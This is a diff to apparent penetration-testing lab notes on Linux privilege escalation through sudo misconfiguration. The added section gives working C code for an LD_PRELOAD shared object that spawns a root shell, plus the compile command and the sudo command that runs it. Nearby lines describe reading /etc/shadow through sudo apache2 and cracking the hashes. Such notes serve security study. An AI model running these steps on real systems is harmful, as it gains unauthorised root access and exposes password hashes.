@@ -323,17 +323,14 @@ sudo -l
 sudo apache2 -f /etc/shadow
 ````
 - Copy hash to attacker box and crack with john
-### Sudo Environment Variables
+### Sudo -l LD_PRELOAD
 - Sudo can be configured to inherit certain environment variables from the user's environment.
-- Check which environment variables are inherited (look for the env_keep options):
+- Check which environment variables are inherited (look for the env_keep+=LD_PRELOAD options):
 - Output you're looking for
 ````
 user@debian:~/tools/sudo$ sudo -l
 Matching Default entries for user on this host:
   env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
-````
-````
-sudo -l
 ````
 - LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. 
 - LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
@@ -362,6 +359,33 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 - A root shell should spawn. 
 - Errors: Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. 
 - Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
+#### Sudo -l LD_PRELOAD Method 2
+1. In command prompt type: sudo -l
+2. From the output, notice that the LD_PRELOAD environment variable is intact.
+- Exploitation
+- 1. Open a text editor and type:
+````
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+````
+- 2. Save the file as x.c
+- 3. In command prompt type:
+````
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+`````
+- 4. In command prompt type:
+````
+sudo LD_PRELOAD=/tmp/x.so apache2
+````
+- 5. In command prompt type: id
 ### Cron Jobs -File permissions
 - Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
 - Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.
